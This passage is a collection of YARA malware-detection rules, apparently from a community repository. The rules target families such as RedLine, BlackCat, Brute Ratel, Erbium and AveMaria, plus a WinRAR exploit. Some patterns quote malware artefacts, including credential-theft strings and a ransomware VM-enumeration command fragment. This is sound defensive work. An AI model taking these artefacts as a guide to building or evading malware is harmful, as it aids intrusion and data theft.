        // rather than a hunting rule since the oleObject it is matching is
        // compressed in the doc zip
        
        $xor_string0 = "LoadLibraryA" xor
        $xor_string1 = "urlmon.dll" xor
        $xor_string2 = "Shell32.dll" xor
        $xor_string3 = "ShellExecuteA" xor
        $xor_string4 = "MoveFileA" xor    
        $xor_string5 = "CreateDirectoryA" xor
        $xor_string6 = "C:\\Windows\\explorer" xor
        $padding = {000001128341000001128341000001128342000001128342}
    
    condition:
        3 of ($xor_string*)
        and $padding
}rule APT_Bitter_PDB_Paths {
    
    meta:
        description = "Detects Bitter (T-APT-17) PDB Paths"
        author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
        tlp = "WHITE"
        yarahub_uuid = "1f78e5ba-4c6c-4f14-9f43-78936d0ab687"
        yarahub_reference_md5 = "71e1cfb5e5a515cea2c3537b78325abf"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"
        reference = "https://www.secuinfra.com/en/techtalk/whatever-floats-your-boat-bitter-apt-continues-to-target-bangladesh"
        date = "2022-06-22"
        hash0 = "55901c2d5489d6ac5a0671971d29a31f4cdfa2e03d56e18c1585d78547a26396"

    strings:
        // Almond RAT
        $pdbPath0 = "C:\\Users\\Window 10 C\\Desktop\\COMPLETED WORK\\" ascii
        $pdbPath1 = "stdrcl\\stdrcl\\obj\\Release\\stdrcl.pdb"

        // found by Qi Anxin Threat Intellingence Center
        // reference: https://mp.weixin.qq.com/s/8j_rHA7gdMxY1_X8alj8Zg
        $pdbPath2 = "g:\\Projects\\cn_stinker_34318\\"
        $pdbPath3 = "renewedstink\\renewedstink\\obj\\Release\\stimulies.pdb"

    condition:
        uint16(0) == 0x5a4d
        and any of ($pdbPath*)
}rule avemaria_rat_yhub {
    meta:
        date = "2022-10-18"
        yarahub_uuid = "bb7a4c5e-c2dc-46a1-8a82-028e4e1c5570"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "7897feb76a3beab6fe8aa9851a894437"
        yarahub_author_twitter = "@billyaustintx"
        author = "Billy Austin"
        description = "Detects AveMaria RAT a.k.a. WarZone"
        malpedia_family = "AVE_MARIA"

    strings:
        $h1 = "find.db" ascii //packed
        $h2 = "encryptedPassword" ascii
        $h3 = "encryptedUsername" ascii
        $h4 = {63 6d 64 2e 65 78 65 20 2f 43 20 70 69 6e 67} // cmd.exe /C ping
        
        $u1 = "logins.json" wide
        $u2 = "usebackq tokens" wide
        $u3 = "\\rdpwrap.ini" wide //persistence
        $u4 = "MidgetPorn" wide
        $u5 = "wmic process call create" wide
        $u6 = "sqlmap.dll" wide
        
    condition:
        uint16(0) == 0x5a4d and filesize < 1125KB and 3 of ($h*) and 4 of ($u*)
}rule binaryObfuscation
{
  meta:
    author = 			"Sean Dalnodar"
    date = 			"2022-05-27"
    yarahub_uuid = 		"3f562951-b59f-4b27-806e-823e99910cac"
    yarahub_license =		"CC0 1.0"
    yarahub_rule_matching_tlp =	"TLP:WHITE"
    yarahub_rule_sharing_tlp = 	"TLP:WHITE"
    yarahub_reference_md5 =	"9c817fe677e2505306455d42d081252c"

  strings:
    $re0 = /=\([0-1,]{512}/

  condition:
    all of them
}rule bruteratelc4 {
    meta:
        author = "spyw4re"
        description = "A Rule to detect brute ratel stager payloads."
        yarahub_author_twitter = "@CryptDeriveKey"
        date = "2023-10-06"
        yarahub_uuid = "950ced7c-f32b-4e02-a343-e2ee18b865ea"
        yarahub_reference_md5 = "2aef21ef6759026b3008e5a9a1cff67f"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.brute_ratel_c4"

    strings:
        $api_hashing = {ac 84 c0 74 07 c1 cf 0d 01 c7 eb f4}
        $push_stack = {50 68 ?? ?? ?? ??}
    
    condition:
        (uint16(0) == 0x5A4D) and all of them
}  

rule BruteRatelConfig
{
    meta: 
        author = "@immersivelabs"
        date = "2022-07-07"
        yarahub_uuid = "8d659456-b774-46db-a36d-6dea912e5e43"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6c044bddd01118d311681a9b2d1dd627"
    strings:
        $config_block = { 50 48 b8 [8] 50 68}
        $split_marker = { 50 48 b8 [8] 50 48 b8 }

    condition:
        filesize < 400KB and $config_block and #split_marker > 30
}
import "pe"

rule bumblebee_win_generic
{
	meta:
		author = "_kphi"
		date = "2022-09-13"
		yarahub_uuid = "2644a2db-481d-4efb-94b4-309a4e73bccc"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "29a405557da7bb24b2f278c5c46dfd3c"

	strings:
		$a1 = "FindFirstFile"
		$a2 = "FindNextFile"
		$a3 = "HeapWalk"
		$a4 = "GetCurrentProcessId"
		$a5 = "GetCurrentThreadId"
		$a6 = "MapViewOfFile"
		$a7 = "SwitchToFiber"
		$a8 = "DeleteFiber"
		$a9 = "RtlLookupFunctionEntry"
		$a10 = "TerminateProcess"
		$a11 = "GetModuleHandleEx"
		$a12 = "FindFirstFileEx"
		$a13 = "GetEnvironmentStrings"
		$a14 = "WriteFile"
		$a15 = "RaiseException"
		
	condition:
		uint16(0) == 0x5A4D
		and pe.exports("DllRegisterServer")
		and 12 of them
}
rule crashedtech_loader {
    meta:
        author = "@luc4m"
        date = "2023-03-26"
        hash_md5 = "53f9c2f2f1a755fc04130fd5e9fcaff4"
        link = "https://medium.com/@lcam/updates-from-the-maas-new-threats-delivered-through-nullmixer-d45defc260d1"
        tlp = "WHITE"

	yarahub_uuid = "6bcec71c-e550-4ff6-b877-3953ef892179"
        yarahub_license =  "CC0 1.0"
        yarahub_rule_matching_tlp =  "TLP:WHITE"
        yarahub_rule_sharing_tlp =  "TLP:WHITE"
        yarahub_reference_md5="53f9c2f2f1a755fc04130fd5e9fcaff4" 

    strings:
        $trait_0 = {02 14 7d ?? ?? ?? ?? 02 28 ?? ?? ?? ?? ?? ?? 02 28 ?? ?? ?? ?? ?? 2a}
        $trait_1 = {?? 02 7b ?? ?? ?? ?? 6f ?? ?? ?? ?? ?? ?? 02 03 28 ?? ?? ?? ?? ?? 2a}
        $trait_2 = {?? 28 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7e ?? ?? ?? ?? 6f ?? ?? ?? ?? 0a 2b ??}
        $trait_4 = {?? 73 ?? ?? ?? ?? 02 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0a 2b ??}
        $trait_5 = {06 6f ?? ?? ?? ?? ?? dc ?? de ?? 26 ?? ?? de ?? 2a}
        $trait_6 = {11 ?? 6f ?? ?? ?? ?? ?? dc 09 6f ?? ?? ?? ?? 16 fe 01 13 ?? 11 ?? 2c ??}
        $trait_7 = {06 6f ?? ?? ?? ?? ?? dc ?? de ?? 26 ?? ?? de ?? 2a}
        $trait_8 = {?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 0a 28 ?? ?? ?? ?? 06 6f ?? ?? ?? ?? 0b 2b ??}

        $str_0 = "username" wide
        $str_1 = "windows" wide
        $str_2 = "client" wide
        $str_3 = "ip" wide
        $str_4 = "api.ipify.org" wide 
        $str_5 = "(.*)<>(.*)" wide

    condition:
        5 of ($str_* ) and 3 of ($trait_*)
}

rule detect_Redline_Stealer {
     meta:
        date = "2023-06-06"
        author ="Varp0s"
        yarahub_reference_md5     = "554d25724c8f6f53af8721d0ef6b6f42"
        yarahub_uuid = "671d6f32-8236-46b5-80e3-057192936607"
        yarahub_license =  "CC0 1.0"
        yarahub_rule_matching_tlp =  "TLP:WHITE"
        yarahub_rule_sharing_tlp =  "TLP:WHITE"
        tlp = "WHITE"

    strings:

        $req0 = {72 75 6E 64 6C 6C 33 32 2E 65 78 65 20 25 73 61} 
        $req1 = {43 6F 6E 74 72 6F 6C 20 50 61 6E 65 6C 5C 44 65}
        $req2 = {77 65 78 74 72 61 63 74 2E 70 64 62 00} 
        $req3 = {49 58 50 25 30 33 64 2E 54 4D 50 00}
        $req4 = {54 4D 50 34 33 35 31 24 2E 54 4D 50 00}
        $req5 = {43 6F 6D 6D 61 6E 64 2E 63 6F 6D 20 2F 63 20 25} 
        $req6 = {55 50 44 46 49 4C 45 25 6C 75 00}


              
    condition:
        all of them
}rule detect_Redline_Stealer_V2 {
     meta:
        date = "2023-06-06"
        author ="Varp0s"
        yarahub_reference_md5     = "554d25724c8f6f53af8921d0ef6b6f42"
        yarahub_uuid = "e20669f7-da89-41f6-abeb-c3b5a770530e"
        yarahub_license =  "CC0 1.0"
        yarahub_rule_matching_tlp =  "TLP:WHITE"
        yarahub_rule_sharing_tlp =  "TLP:WHITE"
        tlp = "WHITE"
    strings:

        $req0 = {41 00 75 00 74 00 68 00 6F 00 72 00 69 00 7A} 
        $req1 = {6E 00 65 00 74 00 2E 00 74 00 63 00 70 00 3A 00}
        $req3 = {44 00 65 00 63 00 63 00 69 00 65 00 00 00}
        $req4 = {61 00 6D 00 6B 00 6D 00 6A 00 6A 00 6D 00 6D 00}
        $req5 = {31 00 36 00 33 00 2E 00 31 00 32 00 33 00 2E 00}
        $req6 = {59 00 61 00 6E 00 64 00 65 00 78 00 5C 00 59 00}
        $req7 = {31 00 2A 00 2E 00 31 00 6C 00 31 00 64 00 31 00}

              
    condition:
        3 of them 
}rule ELF_RANSOMWARE_BLACKCAT : LinuxMalware
{
	meta:
		description = "Detect Linux version of BlackCat Ransomware"
		author = "Jesper Mikkelsen"
		reference = "https://www.virustotal.com/gui/file/056d28621dca8990caf159f8e14069a2343b48146473d2ac586ca9a51dfbbba7"
		date = "2022-05-10"
        yarahub_reference_md5 = "c7e39ead7df59e09be30f8c3ffbf4d28"
        yarahub_uuid = "4354fe5a-ee0c-47e3-a595-2824dd82928d"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
		techniques = "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
		tactic = "Defense Evasion"
		mitre_att = "T1222.002"
		sharing = "TLP:WHITE"
        dname = "Ransom.Linux.BLACKCAT.YXCDFZ"
		score = 75
	strings:
		$pattern0 = "sbin*/cdrom*/dev*/etc*/lib**lost+found*/proc*/run*/snap*/tmp*/sys*/usr*/bi"
		$pattern1 = "n `vim-cmd vmsvc/getallvms| awk '{print$1}'`;do vim-cmd vmsvc/sn"
		$pattern2 = { BB 6C EA 3F AA 84 31 C4 13 19 F2 
        	   4C 47 F1 29 B7 FE 88 43 CA EF 60 
               98 31 56 7A 97 30 CD 92 4C CB 74 
               EB 26 B6 65 03 FD 4D DC D1 A1 A7
               CC 39 7A 5C 75 40 10 21 64 A8 CB
               DA DD B2 C4 DB 46 5A 1F 20 }
		$pattern3 = { 78 15 58 9C 99 1A C5 47 BC 7B B9
        	   31 5D 74 24 C7 E9 E0 72 B1 08 EF
               EF 6A 2D 8E 93 1C CC 81 0E DC 66
               4C 6B AA 87 43 F6 71 A2 22 8A 07
               43 2D 17 9D CB 0B 27 EB 2A 04 BA
               30 0F 65 C6 46 EE 6A 5B 86 }
		$pattern4 = { 72 78 B3 93 0F 69 5B 48 F4 D0 89
        	   14 1E C0 61 CF E5 79 18 A5 98 68
               F0 7E 63 D1 EA 71 62 4A 02 AA 99 
               F3 7B C0 E4 E2 93 1B 1F 5B 0E D8 
               97 0F E6 03 6C B6 9F 69 11 A7 77 
               B2 EA 1E 6D BD EB 85 85 66 }
		$pattern5 = { 39 67 68 97 DB 59 03 55 34 5A B8 
        	   62 DF 64 D3 A0 30 D1 0A 58 A9 EF 
               61 9A 46 EC DA AD AD D2 B1 6F 42 
               AB AA B3 A0 95 C1 71 4F 96 7A 46 
               A4 A8 11 84 4B 25 4A 8F BA 1B 21 
               4D 55 18 9A 7A BE 26 F1 B8 51 }
		$pattern6 = { 4B 35 35 C4 3D D4 3A 59 A7 5C 1C 
        	   69 D1 BD 13 F4 0A 98 72 88 7C 79 
               7D 15 BC D3 B0 70 CA 32 BF ED 11 
               17 DE 91 67 F6 D1 0C 91 42 45 5A 
               E7 A3 4A C7 3C 86 2B BB 4A 67 24 
               26 8A CD E9 43 FC 2C E6 DE 27 09 
               87 A2 51 E8 88 3F }
		$pattern7 = { 6B DA AE D5 B0 21 17 CF BF 20 8C 
        	   27 64 DB 35 5E 0E A6 24 B6 D5 5D 
               9D 2B 16 D5 C9 C3 CD 2E 70 BA A7 
               53 61 52 7C A8 D8 48 73 A9 43 A0 
               A8 52 FA D9 C2 2F EB 31 19 D4 52 
               BB F0 87 4E 53 2B 7C F7 2A 41 01 
               E6 C2 9A FA 5F D8 95 FB C4 }
	condition:
		all of them
}rule elf_rekoobe_b3_06c9 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-09-02"
        description               = "detects the Rekoobe Linux backdoor"
        hash1_md5                 = "55ab7e652976d25997875f678c935de7"
        hash1_sha1                = "dc6beb5019ee21ab207c146ece5080d00f20a103"
        hash1_sha256              = "a89ebd7157336141eb14ed9084491cc5bdfce103b4db065e433dff47a1803731"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "55ab7e652976d25997875f678c935de7"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "06c95657-8897-443c-bc8e-f0f5cf6cf055"

    strings:
        $sha_1  = {01 23 45 67 [0-10] 89 AB CD EF [0-10] FE DC BA 98 [0-10] 76 54 32 10 [0-10] F0 E1 D2 C3}

        $hmac_1 = {36 36 36 36 36 36 36 36}
        $hmac_2 = {5C 5C 5C 5C 5C 5C 5C 5C}

        $str_term_1  = {C6 00 54}
        $str_term_2  = {C6 40 03 4D}
        $str_term_3  = {C6 40 01 45}
        $str_term_4  = {C6 40 04 3D}
        $str_term_5  = {C6 40 02 52}
        $str_term_6  = {C6 40 02 52}

        $str_histfile_1 = {C6 00 48}
        $str_histfile_2 = {C6 40 05 49}
        $str_histfile_3 = {C6 40 01 49}
        $str_histfile_4 = {C6 40 06 4C}
        $str_histfile_5 = {C6 40 02 53}
        $str_histfile_6 = {C6 40 07 45}
        $str_histfile_7 = {C6 40 03 54}
        $str_histfile_8 = {C6 40 08 3D}
        $str_histfile_9 = {C6 40 04 46}

    condition:
        uint32(0) == 0x464C457F and
        (
            all of them
        )
}


rule Embedded_RTF_File
{
    meta:
        author = "Nicholas Dhaeyer - @DhaeyerWolf"
        date_created = "2023-07-18"
        date_last_modified = "2023-07-18"
        description = "Related to CVE-2023-36884. Hunts for any zip-like archive (eg. office documents) that have an embedded .rtf file, based on the '.rtf' extension of the file."
		yarahub_uuid = "800682b8-e810-49d2-91b3-dfaafb61637f"
		date = "2023-07-18"
		yarahub_license = "CC BY-SA 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "b6ad6198e155921dc11c855c03d8c264"

    strings:
		$header = { 50 4B 03 04 } //beginning of a archive file
		$header1 = { D0 CF 11 E0 A1 B1 1A E1 } //Older formats of office files
	
        $rtf =  { 2E 72 74 66 } //.rtf
		
		$str1 = "Microsoft Office Word" //doc
		$str2 = "MSWordDoc" //doc
		$str3 = "Word.Document.8" //doc
		$str4 = "Microsoft Office PowerPoint" //ppt
		$str5 = "Microsoft Excel" //xls
		$str6 = "Excel.Sheet.8" //xls
		$str7 = "document.xml" //docx
		$str8 = "presentation.xml" //pptx
		$str9 = "workbook.xml" //xlsx
		$str10 = "workbook.bin" //xlsb
		$str11 = "<?mso-application progid=\"Word.Document\"?>" //word_xml
		$str12 = "<?mso-application progid=\"PowerPoint.Show\"?>" //ppt_xml
		$str13 = "<?mso-application progid=\"Excel.Sheet\"?>" //Excel_xml
		
    condition:
        ($header at 0 or $header1 at 0)
		and (#rtf > 1)
		and 1 of ($str*)
}rule Erbium_Loader
{
    meta:
        author                    = "@_FirehaK <yara@firehak.com>"
        date                      = "2022-09-02"
        description               = "Detects Erbium Stealer's loader"
        malpedia_family           = "win.erbium_stealer"
        modified                  = "2022-09-02"
        yarahub_author_twitter    = "@_FirehaK"
        yarahub_author_email      = "yara@firehak.com"
        yarahub_reference_link    = "https://tria.ge/220901-136gasbhdm/behavioral2"
        yarahub_reference_md5     = "7e2e4af82407b97d8f00d1ff764924d4"
        yarahub_uuid              = "1f3b58cb-cb17-45ba-aa2a-a719a4a21052"
        yarahub_license           = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"

    strings:
        $s1 = "api.php?method=getstub&bid=" wide

        $x1 = { 53 6a?? 68???????? 50 ff15???????? 8bd8 894424 }
        $x2 = { 8b35???????? 40 6a00 6a00 50 68???????? 6a00 6a00 ffd6 8bc8 33c0 660f1f440000 }
        $x3 = { 51 8d4c24?? 40 51 50 68???????? 6a00 6a00 ffd6 33c0 90 }
        $x4 = { 8b5c24?? 6a00 6a01 6a01 6a01 6a01 57 53 ff 50 e8???????? 83c4?? 85db 74 }
        $x5 = { c745??00000000 8d55?? 52 6a40 8b45?? 8b48?? 51 8b55?? 52 8b45?? 50 ff55?? 33c9 894d?? 894d?? 894d?? 894d?? 894d?? 894d?? 8b15???????? 8955?? a1???????? 8945?? 8b4d?? 894d?? 8b55?? 8955?? 8b45?? 8945?? 6a00 6800100000 8b4d?? 51 8b55?? 52 8b45?? 50 ff55?? 85c0 75  }
        $x6 = { 6800800000 6a00 8b55f8 52 8b4508 50 ff55fc 6800800000 6a00 8b4df0 51 8b5508 52 ff55fc 6800800000 6a00 8b45e8 50 8b4d08 51 ff55fc 32c0 eb0c }

    condition:
        uint16(0) == 0x5a4d
        and (
            2 of ($x*)
            or (
                $s1
                and 1 of ($x*)
            )
        )
}rule Erbium_Stealer_Obfuscated
{
    meta:
        author                    = "@_FirehaK <yara@firehak.com>"
        date                      = "2022-09-02"
        description               = "Erbium Stealer in its obfuscated format"
        malpedia_family           = "win.erbium_stealer"
        modified                  = "2022-09-09"
        yarahub_author_twitter    = "@_FirehaK"
        yarahub_author_email      = "yara@firehak.com"
        yarahub_reference_link    = "https://tria.ge/220902-mbcs1seef7"
        yarahub_reference_md5     = "71c3772dd2f4c60a13e3e5a1180154b7"
        yarahub_uuid              = "29756611-4992-4ff5-b2cb-ffe867dfb823"
        yarahub_license           = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"

    strings:
        // <space>Zig Zig Zig
        $zig = { 20 5A 69 67 20 5A 69 67 20 5A 69 67 }
        // ZigRich Zig
        $richzig = { 5A 69 67 52 69 63 68 20 5A 69 67 }

        $x1 = { e800000000 8b0424 83042408 c3 }
        $x2 = { 64a130000000 8b400c 8985????ffff 8b85????ffff 8b400c 8985????ffff }
        $x3 = { b8???????? f7ea 035424?? c1fa?? 8bc2 c1e8?? 03c2 8b5424?? 0fbec0 8aca 6bc039 2ac8 80c137 304c14?? 42 895424?? 83fa?? 7c }
        $x4 = { 33d2 8bc1 f7f6 80c2?? 30?40c(??|????0000) 41 83f9?? 7c }
        $x5 = { 8b??????ffff 03??????ffff 0fbe?? 8b85????ffff 99 be??000000 f7fe 83c2?? 33ca 8b95????ffff 0395????ffff 880a eb }
        $x6 = { 8b45?? 0fbe4c05?? 8b45?? 99 be??000000 f7fe 83c2?? 33ca 8b55?? 884c15?? eb }
        $x7 = { 6a05 68???????? 6a00 68????0000 e8???????? 83c410 33d2 b915000000 f7f1 8955?? 837d??00 75?? 6a?? 68???????? 6a?? 68????0000 e8???????? 83c4?? 33d2 b910270000 f7f1 8995????ffff }
        $x8 = { 6a05 68???????? 6a00 68????0000 e8???????? 83c410 33d2 6a?? 59 f7f1 8955?? 837d??00 75?? 6a05 68???????? 6a00 68????0000 e8???????? 83c410 33d2 b910270000 f7f1 8995????ffff }
        $x9 = { 6910???????? 83c0?? 69db???????? 8bca c1e918 33ca 69d1???????? 33da 83ef?? 75 }

    condition:
        uint16(0) == 0x5a4d
        and (
            (
                $zig
                and $richzig
                and 2 of ($x*)
            )
            or 3 of ($x*)
        )
}rule EXPLOIT_WinRAR_CVE_2023_38831_Aug23 {
    meta:
        version = "1.0"
        date = "2023-08-23"
        modified = "2023-08-23"
        status = "RELEASED"
        sharing = "TLP:CLEAR"
        source = "SECUINFRA Falcon Team"
        author = "Marius Genheimer @ Falcon Team"
        description = "Detects ZIP archives potentially exploiting CVE-2023-38831 in WinRAR"
        category = "EXPLOIT"
        mitre_att = "T1203"
        actor_type = "CRIMEWARE"
        reference = "https://www.group-ib.com/blog/cve-2023-38831-winrar-zero-day"
        minimum_yara = "4.2"
        hash0 = "43f5eb815eed859395614a61251797aa777bfb694a9ef42fbafe058dff84d158"
        hash1 = "61c15d6a247fbb07c9dcbce79285f7f4fcc45f806521e86a2fc252a311834670"
        hash2 = "2010a748827129b926cf3e604b02aa77f5a7482da2a15350504d252ee13c823b"
        hash3 = "bfb8ca50a455f2cd8cf7bd2486bf8baa950779b58a7eab69b0c151509d157578"
        yarahub_uuid = "67176e05-1858-4ff4-ad4b-154f549ec5d4"
        yarahub_reference_md5 = "3a7ad5fdfc9e51c4ee5df425169add1a"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_author_twitter = "@SI_FalconTeam"

    strings:
        $kw_1 = "Trade" nocase ascii
        $kw_2 = "Trading" nocase ascii
        $kw_3 = "Strategy" nocase ascii
        $kw_4 = "Strategies" nocase ascii
        $kw_5 = "Screenshot" nocase ascii
        $kw_6 = "Indicator" nocase ascii

        $doubleext_cmd = {2E ?? ?? ?? 20 2E 63 6D 64}
        $doubleext_bat = {2E ?? ?? ?? 20 2E 62 61 74}
        $doubleext_vbs = {2E ?? ?? ?? 20 2E 76 62 73}
        $doubleext_wsf = {2E ?? ?? ?? 20 2E 77 73 66}
        $doubleext_wsh = {2E ?? ?? ?? 20 2E 77 73 68}
        $doubleext_ps1 = {2E ?? ?? ?? 20 2E 70 73 31}
        $doubleext_js = {2E ?? ?? ?? 20 2E 6A 73}

        $s_ico = ".ico" ascii

    condition:
        uint16(0) == 0x4B50
        and (any of ($kw_*) or none of ($kw_*))
        and any of ($doubleext_*)
        and #s_ico >= 1
}rule GHISLER_Stealer_1 : ghisler stealer spyware
{
    meta:
        author                    = "Andre Gironda"
        date                      = "2022-11-11"
        description               = "GHISLER Golang based GO Stealer , POST /sendlog to http port 5000 , Userid HTTP header"
        hash                      = "30c1f93a3d798bb18ef3439db0ada4e0059e1f6ddd5d860ec993393b31a62842"
        hash2                     = "82040e02a2c16b12957659e1356a5e19"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_twitter    = "@AndreGironda"
        yarahub_license           = "CC0 1.0"
        yarahub_reference_md5     = "82040e02a2c16b12957659e1356a5e19"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "49ce8292-4a72-42d1-ab38-cdc076ff503d"
   strings:
        $hex_45ef40 = { 83 ec 24 8b 5c 24 28 c7 44 24 20 ff ff ff ff 89 5c 24 1c 64 8b 0d 14 00 00 00 8b 89 00 00 00 00 8b 49 18 8b 89 c8 01 00 00 89 4c 24 18 c7 44 24 14 00 00 00 00 c7 44 24 10 }
        $hex_4022a0 = { 8b 6c 24 04 f7 c5 07 00 00 00 74 05 e8 af }
        $s1 = "SetWaitableTimer" 
        $s2 = "SwitchToThread"
        $s3 = "time.Time.date"
        $s4 = "time.now"
        $go = "vendor/golang.org/x/net/dns/dnsmessage/message.go"
        $user = "Userid:"
        $name = "GHISLER"
    condition:
        all of them
}
rule Guloader_VBScript {

  meta:
      author = "Ankit Anubhav - ankitanubhav.info"
      description = "Detects GuLoader/CloudEye VBScripts"
      date = "2022-07-14"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
      yarahub_reference_md5 = "00e59c5ea76face15c42450c71676e03"
      yarahub_uuid = "7d7e2b7c-5536-4688-b202-e79c401e7195"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.CloudEye"

strings:


	$x = { 20 26 20 22 }
	$y = { 54 69 6d 65 56 61 6c 75 65 28 22 ( 31 3a 31 3a 31 | 32 3a 32 3a 32 | 33 3a 33 3a 33 | 34 3a 34 3a 34 | 35 3a 35 3a 35 | 36 3a 36 3a 36 | 37 3a 37 3a 37 | 38 3a 38 3a 38 | 39 3a 39 3a 39 | 31 30 3a 31 30 3a 31 30 | 31 31 3a 31 31 3a 31 31 | 31 32 3a 31 32 3a 31 32 | 31 33 3a 31 33 3a 31 33 | 31 34 3a 31 34 3a 31 34 | 31 35 3a 31 35 3a 31 35 | 31 36 3a 31 36 3a 31 36 | 31 37 3a 31 37 3a 31 37 | 31 38 3a 31 38 3a 31 38 | 31 39 3a 31 39 3a 31 39 | 32 30 3a 32 30 3a 32 30 | 32 31 3a 32 31 3a 32 31 | 32 32 3a 32 32 3a 32 32 | 32 33 3a 32 33 3a 32 33 ) 22 29 }
	//$z = { 44 69 6d } new variants have started using loose binding so commenting out this line !!
condition:
	#x > 20 and $y and filesize < 1999999


}
rule hunt_redline_stealer
{
  meta:
      description = "Search for samples containing certain fingerprints"
      date = "2023-01-12"
      yarahub_reference_md5 = "26ddf1d4f84651f1b35fb6885d6ed325"
      yarahub_uuid = "0835dd41-46f7-4113-8248-6f31e751e514"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
  strings:
      $a = "(te%psehczev" wide
      $b = {2f 00 3a 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 ?? 00 2f 00 ?? 00 ?? 00 ?? 00 3a 00 ?? ?? 3a 00 ?? ?? ?? ?? 2f 00 3a 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2f 00 ?? ?? ?? ?? ?? ?? ?? ?? 2f 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 00 00}
      $c = "Parella Javan" wide
      $d = "ExotismWaura" wide
  condition:
      uint16(0) == 0x5A4D and (any of them)
}rule IcedID_ISO {

  meta:
      author = "Ankit Anubhav - ankitanubhav.info"
      description = "Detects IcedID ISO archives"
      date = "2022-08-18"
      yarahub_author_twitter = "@ankit_anubhav"
      yarahub_author_email = "ankit.yara@inbox.ru"
      yarahub_reference_link = "https://twitter.com/ankit_anubhav"
      yarahub_reference_md5 = "d5f065d3ac9dc75041af218718f4950e"
      yarahub_uuid = "53d04c1d-fd1a-4928-ae92-adfcc62dc029"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
      malpedia_family = "win.icedid"

strings:


	$iso = "This disc contains"
	$exe = "This program cannot be run"
	$txrun = {74 78 74 2c 22}

condition:
	$iso and $exe and $txrun and filesize < 999999


}
rule ISO_LNK_JS_CMD_DLL {
   meta:
      description = "Detects iso > lnk > js > cmd > dll execution chain"
      author = "_jc"
      date = "2022-09-29"
      yarahub_reference_md5 = "b93bd94b8f568deac0143bf93f7d8bd8"
      yarahub_uuid = "3e54dac2-910d-4dda-a3b4-2fa052556be7"
      yarahub_license = "CC BY 4.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
   strings:
      $lnk_header = { 4C 00 }
	  $minimized_inactive = {07}
	  $js_ext = ".js" nocase

	  $echo_off = { 40 65 63 68 6F [32-64] 33 32} // "@echo..32" to catch .cmd + regsvr32 stitching

	  $js_var = {76 61 72 [1-32] 3D [1-16] 3B} // catches javascript-style variable declaration

	  $mz_dos_mode = {4D 5A [100-110] 44 4F 53 20 6D 6F 64 65} // catches MZ..DOS Mode

   condition:
      // spot minimized_inactive flag; invocation of .js file by lnk
	  $echo_off and $js_var and $mz_dos_mode and
      for any i in (1..#lnk_header):
	  (($minimized_inactive in (@lnk_header[i]+60..@lnk_header[i]+61)) and ($js_ext in (@lnk_header[i]+255..@lnk_header[i]+304)))
}rule ItsSoEasy_Ransomware {
    meta:
		description = "Detect ItsSoEasy Ransomware (Itssoeasy-A)"
		author = "bstnbuck"
		date = "2023-11-02"
        yarahub_author_twitter = "@bstnbuck"
        yarahub_reference_link = "https://github.com/bstnbuck/ItsSoEasy"
        yarahub_uuid = "96513a1b-0870-49c2-9b67-07dd84cf303c"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "1ce280542553dc383b768b9189808e27"
    
	strings:
